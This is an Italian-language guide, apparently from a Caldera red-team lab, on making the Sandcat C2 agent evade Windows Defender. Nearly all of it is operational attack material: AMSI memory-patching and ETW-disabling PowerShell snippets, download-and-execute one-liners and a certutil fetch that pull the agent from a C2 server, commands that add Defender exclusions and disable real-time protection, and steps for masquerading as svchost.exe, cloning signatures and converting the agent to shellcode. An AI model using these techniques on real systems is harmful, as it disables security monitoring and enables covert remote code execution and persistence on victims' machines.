# 🛡️ Guida Anti-Windows Defender per Sandcat
# Perché Defender Rileva Sandcat e Come Evadere Detection

## 🔍 PERCHÉ DEFENDER RILEVA SANDCAT?

### 1. **Signature Detection**
- Binary Go compilato con stringhe IoC (Indicators of Compromise):
  - "mitre"
  - "caldera"  
  - "gocat"
  - "github.com/mitre/gocat"
- Percorsi filesystem sospetti nel binario
- Build ID Go riconoscibile

### 2. **Behavioral Detection**
- Network beacon periodico (HTTP POST)
- Processo che si auto-nomina (modifica argv[0])
- Esecuzione da path non-standard (C:\Users\Public)
- Injection di shellcode (se usi estensioni)

### 3. **AMSI (Antimalware Scan Interface)**
- Scansiona comandi PowerShell prima dell'esecuzione
- Rileva payload base64 encoded comuni
- Intercetta download da HTTP

### 4. **ETW (Event Tracing for Windows)**
- Logga tutte le attività PowerShell
- Traccia System.Net.WebClient downloads
- Monitora process creation

---

## ✅ SOLUZIONI IMPLEMENTATE

### 🔧 **Metodo 1: Compilazione Stealth (CONSIGLIATO)**

Ho creato [build-sandcat-stealth.sh](build-sandcat-stealth.sh) che compila Sandcat con:

#### A. **LDFLAGS Anti-Detection**
```bash
-s                  # Strip symbol table (no function names)
-w                  # Strip DWARF debug info  
-buildid=           # Remove Go build ID
-trimpath           # Remove filesystem paths
-X main.key=RANDOM  # Randomize XOR encryption key
```

#### B. **GoHide Packer**
Offusca automaticamente nel binario:
- `"mitre"` → stringhe random
- `"caldera"` → stringhe random
- `"gocat"` → stringhe random
- `"github.com"` → stringhe random
- Username locale → randomizzato

#### C. **Istruzioni Uso**
```bash
cd /home/morgana/caldera

# 1. Compila payload offuscati
./build-sandcat-stealth.sh

# 2. Restart Caldera per caricare nuovi payload
sudo systemctl restart caldera

# 3. Verifica payload generati
ls -lh plugins/sandcat/payloads/sandcat.go-*
```

**Output atteso:**
```
sandcat.go-windows  → svchost.exe con GoHide applicato
sandcat.go-linux    → systemd-networkd 
sandcat.go-darwin   → mdworker
```

---

### 🔧 **Metodo 2: Deployment con AMSI Bypass**

Ho creato [deploy-sandcat-stealth.ps1](deploy-sandcat-stealth.ps1) che include:

#### A. **AMSI Memory Patching**
```powershell
# Patch AmsiContext in memoria → disabilita scanning
$a = [Ref].Assembly.GetTypes()
# ... trova amsiContext e lo setta a [IntPtr]::Zero
```

#### B. **ETW Disabling**
```powershell
# Disabilita PSEtwLogProvider → no logging
$etw.GetField('etwProvider','NonPublic,Static').SetValue($null, 0)
```

#### C. **Script Block Logging Bypass**
```powershell
# Disabilita PowerShell transcript logging
$settings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```

#### D. **Istruzioni Uso**

**Su target Windows:**
```powershell
# Da PowerShell con diritti Admin:
IEX (New-Object Net.WebClient).DownloadString('http://192.168.124.133:8888/deploy-sandcat-stealth.ps1')

# Oppure scarica ed esegui:
Invoke-WebRequest -Uri "http://192.168.124.133:8888/deploy-sandcat-stealth.ps1" -OutFile "$env:TEMP\deploy.ps1"
PowerShell -ExecutionPolicy Bypass -File "$env:TEMP\deploy.ps1"
```

**Features dello script:**
- ✅ Bypassa AMSI, ETW, logging
- ✅ Termina istanze esistenti
- ✅ Hidden process (CreateNoWindow)
- ✅ Verifica download integrity
- ✅ Gestisce certificati SSL self-signed
- ✅ Fallback su path alternativi

---

### 🔧 **Metodo 3: Exclusion (Metodo Brutale ma Efficace)**

Se hai accesso Admin sul target:

```powershell
# Aggiungi exclusion per path
Add-MpPreference -ExclusionPath "C:\Users\Public"
Add-MpPreference -ExclusionPath "$env:APPDATA\Microsoft\Windows"

# Aggiungi exclusion per process name
Add-MpPreference -ExclusionProcess "svchost.exe"

# Disabilita Real-Time Protection (temporaneo)
Set-MpPreference -DisableRealtimeMonitoring $true

# Verifica exclusions
Get-MpPreference | Select-Object Exclusion*
```

**⚠️ Attenzione:** 
- Lascia tracce evidenti in Windows Event Log
- Richiede Admin
- Policy aziendale potrebbe ripristinare settings

---

### 🔧 **Metodo 4: Obfuscators Nativi Caldera**

Caldera supporta obfuscators per offuscare comandi al runtime:

#### Obfuscators Disponibili:
```bash
plugins/stockpile/app/obfuscators/
├── base64_jumble.py      # Base64 con padding random
├── base64_no_padding.py  # Base64 senza padding
├── caesar_cipher.py      # Caesar cipher con shift random
└── steganography.py      # Nasconde comandi in immagini gatti!
```

#### Come Usarli:

**Via UI Web:**
1. Vai su http://192.168.124.133:8888
2. Login: red / admin
3. Operations → Crea nuova operation
4. Seleziona "Obfuscator" dropdown
5. Scegli: **base64_jumble** (consigliato per Windows)

**Via agents.yml:**
```yaml
# Aggiungi a /home/morgana/caldera/conf/agents.yml:
obfuscator: base64_jumble
```

---

## 🎯 STRATEGIA CONSIGLIATA (Step-by-Step)

### **FASE 1: Preparazione Payload (Sul tuo Kali)**

```bash
# 1. Compila Sandcat con anti-detection
cd /home/morgana/caldera
./build-sandcat-stealth.sh

# 2. Verifica offuscazione applicata
strings plugins/sandcat/payloads/sandcat.go-windows | grep -i "mitre\|caldera\|gocat"
# Output atteso: NESSUN MATCH (stringhe offuscate)

# 3. Restart Caldera
sudo systemctl restart caldera

# 4. Verifica Caldera attivo
curl -I http://192.168.124.133:8888
```

### **FASE 2: Deployment su Target Windows**

**Opzione A: PowerShell One-Liner (Stealth)**
```powershell
# Sul target Windows:
$s="http://192.168.124.133:8888";IEX (New-Object Net.WebClient).DownloadString("$s/deploy-sandcat-stealth.ps1")
```

**Opzione B: Manual Download (Più controllo)**
```powershell
# 1. Download script
Invoke-WebRequest -Uri "http://192.168.124.133:8888/deploy-sandcat-stealth.ps1" -OutFile "$env:TEMP\d.ps1"

# 2. Esegui con bypass ExecutionPolicy
PowerShell -Exec Bypass -File "$env:TEMP\d.ps1"

# 3. Cleanup
Remove-Item "$env:TEMP\d.ps1" -Force
```

**Opzione C: Certutil (Se PowerShell bloccato)**
```cmd
certutil -urlcache -split -f http://192.168.124.133:8888/file/download svchost.exe
svchost.exe -server http://192.168.124.133:8888 -group red
```

### **FASE 3: Verifica Agent Beacon**

```bash
# Sul Kali, controlla logs Caldera:
sudo journalctl -u caldera -f

# Via UI Web:
# http://192.168.124.133:8888 → Agents tab
# Dovresti vedere nuovo agent con PAW random
```

---

## 🔬 TESTING ANTI-DEFENDER

### Test 1: VirusTotal Scan

```bash
# NON caricare su VirusTotal (brucia signature!)
# Usa invece un scanner locale:

# Su Windows con Defender attivo:
cd C:\Users\Public
# Copia sandcat.go-windows come svchost.exe
curl http://192.168.124.133:8888/file/download -H "file:sandcat.go" -H "platform:windows" -o svchost.exe

# Se Defender NON lo blocca → SUCCESS!
```

### Test 2: AMSI Test

```powershell
# Testa se AMSI è bypassato:
# Questo comando DOVREBBE essere bloccato da AMSI:
'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'

# Se dopo il bypass questo NON è bloccato → AMSI disabled ✓
```

### Test 3: Process Monitoring

```powershell
# Verifica processo in esecuzione:
Get-Process svchost | Where-Object {$_.Path -like "*Public*"} | Format-List *

# Check network connections:
Get-NetTCPConnection | Where-Object {$_.OwningProcess -eq (Get-Process svchost | Where-Object {$_.Path -like "*Public*"}).Id}
```

---

## 🚨 SE DEFENDER LO RILEVA ANCORA

### Diagnostica:

```powershell
# 1. Controlla quale componente Defender lo ha bloccato:
Get-MpThreatDetection | Select-Object -Last 5

# 2. Controlla il detection name:
Get-MpThreat | Select-Object ThreatName, Resources

# 3. Verifica Real-Time Protection status:
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, *Signature*
```

### Soluzioni Aggiuntive:

#### 1. **UPX Packer (Compressione)**
```bash
# Installa UPX
sudo apt install upx-ucl

# Packa il binario
upx --best --lzma plugins/sandcat/payloads/sandcat.go-windows

# ⚠️ UPX è riconosciuto da alcuni AV come tecnica di packing
```

#### 2. **SigThief (Signature Cloning)**
```bash
# Copia firma digitale da binario legittimo:
git clone https://github.com/secretsquirrel/SigThief
python3 SigThief/sigthief.py -i C:\\Windows\\System32\\calc.exe -t sandcat.go-windows -o svchost_signed.exe
```

#### 3. **Donut (Shellcode Loader)**
```bash
# Converti in shellcode position-independent:
git clone https://github.com/TheWover/donut
cd donut && make
./donut -f sandcat.go-windows -o sandcat.bin -a x64

# Poi carica con custom loader
```

#### 4. **Sleep Obfuscation**
Modifica `agents.yml`:
```yaml
sleep_min: 60        # Beacon ogni 60-120 sec (meno sospetto)
sleep_max: 120
jitter: 30/60        # Jitter 30-60% per evitare pattern detection
```

---

## 📊 MATRICE DETECTION vs EVASION

| Tecnica Detection      | Metodo Evasion Implementato            | Status  |
|------------------------|----------------------------------------|---------|
| Static Signature       | GoHide string obfuscation              | ✅ DONE |
| PE Header Analysis     | LDFLAGS -s -w -buildid=                | ✅ DONE |
| String IoCs            | Trimpath + random key                  | ✅ DONE |
| AMSI Scanning          | Memory patching in PowerShell          | ✅ DONE |
| ETW Logging            | PSEtwLogProvider disabling             | ✅ DONE |
| Script Block Logging   | cachedGroupPolicySettings mod          | ✅ DONE |
| Behavioral (Network)   | Jitter + high sleep intervals          | ⚠️ CONFIG|
| Behavioral (Process)   | Process name masquerading              | ✅ DONE |
| Heuristic Analysis     | Exclusions o sleep obfuscation         | 🔧 MANUAL|

---

## 🎓 BEST PRACTICES

### DO ✅
- Usa payload compilati con [build-sandcat-stealth.sh](build-sandcat-stealth.sh)
- Deploy con [deploy-sandcat-stealth.ps1](deploy-sandcat-stealth.ps1) per AMSI bypass
- Usa nomi processi legittimi: `svchost.exe` (Windows), `systemd-networkd` (Linux)
- Configura sleep_min alto (60+) per ridurre beacon frequency
- Testa in VM isolata PRIMA del target reale
- Monitora logs Defender per capire detection triggers

### DON'T ❌
- NON caricare payload su VirusTotal (brucia signature)
- NON usare payload default senza obfuscation
- NON deployare da path sospetti (C:\Temp, Desktop)
- NON usare beacon interval troppo bassi (<30 sec)
- NON lasciare PowerShell history (è loggata!)
- NON riutilizzare stesso payload su target multipli

---

## 📚 RISORSE ADDIZIONALI

### Script Creati:
- [build-sandcat-stealth.sh](build-sandcat-stealth.sh) - Compiler con anti-detection
- [deploy-sandcat-stealth.ps1](deploy-sandcat-stealth.ps1) - Deployment con AMSI bypass
- [deploy-sandcat-linux.sh](deploy-sandcat-linux.sh) - Linux deployment
- [SANDCAT_DEPLOY_MULTIPLATFORM.txt](SANDCAT_DEPLOY_MULTIPLATFORM.txt) - One-liners

### Caldera Docs:
- GoHide Packer: `plugins/stockpile/app/packers/gohide.py`
- Obfuscators: `plugins/stockpile/app/obfuscators/`
- Agent Config: `conf/agents.yml`

### Research Papers:
- AMSI Bypass Techniques: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell
- ETW Patching: https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
- Go Binary Obfuscation: https://github.com/burrowers/garble

---

## 🎯 QUICK REFERENCE

```bash
# COMPILATION
cd /home/morgana/caldera && ./build-sandcat-stealth.sh && sudo systemctl restart caldera

# DEPLOYMENT (Windows target)
$s="http://192.168.124.133:8888";IEX (New-Object Net.WebClient).DownloadString("$s/deploy-sandcat-stealth.ps1")

# CHECK AGENT
curl -u red:admin http://192.168.124.133:8888/api/v2/agents

# MONITOR
sudo journalctl -u caldera -f
```

---

**🛡️ Remember:** AV evasion è un cat-and-mouse game. Queste tecniche funzionano *oggi* ma Defender viene aggiornato costantemente. 

**Stay updated, stay stealthy! 🐱‍👤**
